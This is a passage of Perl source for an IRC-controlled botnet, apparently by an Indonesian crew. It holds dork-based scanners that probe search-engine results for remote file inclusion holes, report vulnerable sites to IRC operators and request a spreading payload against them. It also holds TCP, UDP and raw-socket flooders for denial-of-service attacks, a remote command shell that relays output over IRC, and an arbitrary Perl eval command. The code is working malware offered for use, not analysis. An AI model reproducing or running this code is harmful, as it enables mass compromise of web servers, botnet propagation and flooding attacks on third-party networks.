  sendraw($IRC_cur_socket, "PRIVMSG Oops :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
my $test2="http://".$sito.$bug.$spread."???????";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /31337/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4ON: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4ON: 10$print10 6..::4@KAmpUngAN6::..");
  my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### ASK
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @asklist=&ask($dork);
push(my @tot, @asklist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 1Total:9 ".scalar(@tot)." 6TEMPIK:9 ".scalar(@puliti)."6..::4@KAmpUngAN6::..");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9ASK 1Finish 4$dork 6..::4@KAmpUngAN6::..");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /31337/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Oops :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
my $test2="http://".$sito.$bug.$spread."???????";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /31337/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4SILIT: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4SILIT: 10$print10 6..::4@KAmpUngAN6::..");
  my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### FireBall
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @fireball=fireball($dork);
push(my @tot, @fireball);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 1Total:9 ".scalar(@tot)." 6TEMPIK:9 ".scalar(@puliti)."6..::4@KAmpUngAN6::..");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9FIREBALL 1Finish 4$dork 6..::4@KAmpUngAN6::..");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /31337/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4TEMPIK: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4TEMPIK: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Oops :6..::4@KAmpUngAN6::.. 4@9Vuln 4TEMPIK: 10$print10 6..::4@KAmpUngAN6::..");
my $test2="http://".$sito.$bug.$spread."???????";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /31337/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4SILIT: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4SILIT: 10$print10 6..::4@KAmpUngAN6::..");
  my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}
#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################
if ($funcarg =~ /^tembak3\s+(.*)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@SNIPPER12=- 1TEMBAAAAAK 4 ".$1." 1 pada port 80 for 4 ".$2." 12 detik .");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@SNIPPER12=- 1TEWAS MUSUHNYA 4 ".$1.".");
}
#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################
if ($funcarg =~ /^tembak1\s+(.*)\s+(\d+)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@SNIPPER12] 1TEMBAAAAAAAAAK 4 ".$1." 12 dengan 4 ".$2." 12 Kb sampah for 4 ".$3." 12 detik.");
my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
$dtime = 1 if $dtime == 0;
my %bytes;
$bytes{igmp} = $2 * $pacotes{igmp};
$bytes{icmp} = $2 * $pacotes{icmp};
$bytes{o} = $2 * $pacotes{o};
$bytes{udp} = $2 * $pacotes{udp};
$bytes{tcp} = $2 * $pacotes{tcp};
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@SNIPPER12] 11LAPORAN4 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 12Kb dalam4 ".$dtime." 12detik ke4 ".$1.".");
}
exit;
}
}
#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################


sub ircase {
my ($kem, $printl, $case) = @_;
  if ($case =~ /^join (.*)/) {
     j("$1");
   }
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
if ($case =~ /^rejoin\s+(.*)/) {
my $chan = $1;
if ($chan =~ /^(\d+) (.*)/) {
for (my $ca = 1; $ca <= $1; $ca++ ) {
p("$2");
j("$2");
}
}
else {
p("$chan");
j("$chan");
}
}

if ($case =~ /^op/) {
op("$printl", "$kem") if $case eq "op";
my $oarg = substr($case, 3);
op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^deop/) {
deop("$printl", "$kem") if $case eq "deop";
my $oarg = substr($case, 5);
deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^msg\s+(\S+) (.*)/) {
msg("$1", "$2");
}

if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
msg("$2", "$3");
}
}

if ($case =~ /^ctcp\s+(\S+) (.*)/) {
ctcp("$1", "$2");
}

if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
ctcp("$2", "$3");
}
}

if ($case =~ /^nick (.*)/) {
nick("$1");
}

if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
conectar("$2", "$1", 6667);
}

if ($case =~ /^raw (.*)/) {
sendraw("$1");
}

if ($case =~ /^eval (.*)/) {
eval "$1";
}
}


sub shell {
my $printl=$_[0];
my $comando=$_[1];
if ($comando =~ /cd (.*)/) {
chdir("$1") || msg("$printl", "dir itu ga ada bos");
return;
}

elsif ($pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) {
exit;

} else {
my @resp=`$comando 2>&1 3>&1`;
my $c=0;
foreach my $linha (@resp) {
  $c++;
  chop $linha;
  sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
  if ($c == "$linas_max") {
    $c=0;
    sleep $sleep;
  }
}
exit;
}
}
}

sub tcpflooder {
my $itime = time;
my ($cur_time);
my ($ia,$pa,$proto,$j,$l,$t);
$ia=inet_aton($_[0]);
$pa=sockaddr_in($_[1],$ia);
$ftime=$_[2];
$proto=getprotobyname('tcp');
$j=0;$l=0;
$cur_time = time - $itime;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
socket($t,PF_INET,SOCK_STREAM,$proto);
connect($t,$pa)||$j--;
$j++;$l++;
}
$l=0;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
shutdown($t,2);
$l++;
}
}

#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################

sub udpflooder {
my $iaddr = inet_aton($_[0]);
my $msg = 'A' x $_[1];
my $ftime = $_[2];
my $cp = 0;
my (%pacotes);
$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
return(undef) if $cp == 4;
my $itime = time;
my ($cur_time);
while ( 1 ) {
for (my $porta = 1;
$porta <= 65000; $porta++) {
$cur_time = time - $itime;
last if $cur_time >= $ftime;
send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;


for (my $pc = 3;
$pc <= 255;$pc++) {
next if $pc == 6;
$cur_time = time - $itime;
last if $cur_time >= $ftime;
socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
}
}
last if $cur_time >= $ftime;
}
return($cur_time, %pacotes);
}

sub ctcp {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
return unless $#_ == 1;
sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
return unless $#_ == 1;
sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
return unless $#_ == 1;
sendraw("MODE $_[0] -o $_[1]");
}

sub j {
&join(@_);
}

sub join {
return unless $#_ == 0;
sendraw("JOIN $_[0]");

}
sub p { part(@_);
}

sub part {
sendraw("PART $_[0]");
}

sub nick {
return unless $#_ == 0;
sendraw("NICK $_[0]");
}

sub quit {
sendraw("QUIT :$_[0]");
}

#####
# SUBS GOOGLE
#####
sub googlet {
my @dominios = ("ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk");
my @country = ("AE","AR","AT","AU","BE","BR","CA","CH","CL","DE","DK");
my @lang = ("en","es","de","nl","pt-BR","it","de","fo","sv","fr","el");
my @lst;
my $key=key($_[0]);
my $c=0;
foreach my $i (@dominios){
my @lista = google($i,$key,$lang[$c],$country[$c]);
push(@lst,@lista);
$c++;
}
return @lst;
}

sub google(){
my @lst;
my $i=$_[0];
my $key=$_[1];
my $lang= $_[2];
my $country =$_[3];
for($b=0;$b<=5000;$b+=100){
my $Go=("www.google.".$i."/search?hl=".$lang."&q=".key($key)."&num=100&start=".$b."&meta=cr%3Dcountry".$country);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS AllTheWeb
#####

sub allthewebt {
my @lang = ("en","es","de","nl","pt-BR","it","de","fo");
my @lst;
my $key=key($_[0]);
my $c=0;
foreach my $lang (@lang){
my @lista = alltheweb($key,$lang[$c]);
push(@lst,@lista);
$c++;
}
return @lst;
}


sub alltheweb(){
my @lista;
my $key = $_[0];
my $lang= $_[1];
for($b=0;$b<=500;$b+=100){
my $alltheweb=("http://www.alltheweb.com/search?cat=web&_sb_lang=".$lang."&hits=100&q=".key($key)."&o=".$b);
my $Res=query($alltheweb);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub standard()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

#####
# SUBS AOL
#####
sub aol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $AoL=("http://search.aol.com/aol/search?query=".key($key)."&page=".$b."&nt=null&ie=UTF-8");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub aola(){
my @lst;
my $key = $_[0];
for($b=1;$b<=59;$b+=1){
my $AoL=("http://64.12.129.44/aol/search?query=".key($key)."&page=".$b."&count_override=20&lr=lang_en");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub aolb(){
my @lst;
my $key = $_[0];
for($b=1;$b<=59;$b+=1){
my $AoL=("http://64.12.129.44/aol/search?query=".key($key)."&page=".$b."&count_override=20&lr=lang_de");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub aolc(){
my @lst;
my $key = $_[0];
for($b=1;$b<=59;$b+=1){
my $AoL=("http://64.12.129.44/aol/search?query=".key($key)."&page=".$b."&count_override=20&lr=lang_fr");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

#####
# SUBS Yahoo
#####
sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=100){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahooa(){
my @lst;
my $key = $_[0];
for($b=210;$b<=1000;$b+=210){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahoob(){
my @lst;
my $key = $_[0];
for($b=410;$b<=1000;$b+=210){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahooc(){
my @lst;
my $key = $_[0];
for($b=610;$b<=1000;$b+=210){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahood(){
my @lst;
my $key = $_[0];
for($b=810;$b<=1000;$b+=210){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

#####
# SUBS MSN
#####
sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS ASK
#####
sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

#####
# SUBS FireBall
#####
sub fireball(){
my $key=$_[0];
my $inizio=1;
my $pagine=200;
my @lst;
my $av=0;
while($inizio <= $pagine){
my $fireball="http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=fb_loc&idx=all&enc=utf-8";
my $Res=query($fireball);
while ($Res=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
$av=$av+10;
$inizio++;
}
return @lst;
}


sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub query2() {
    $url    = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(10);
    my $response = $ua->request($req);
    return $response->content;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}
return @unici;
}

sub http_query($){
my ($url) = @_;
my $host=$url;
my $query=$url;
my $page="";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~s/$host//;
if ($query eq "") {$query="/";};
eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
};
return $page;
}
}

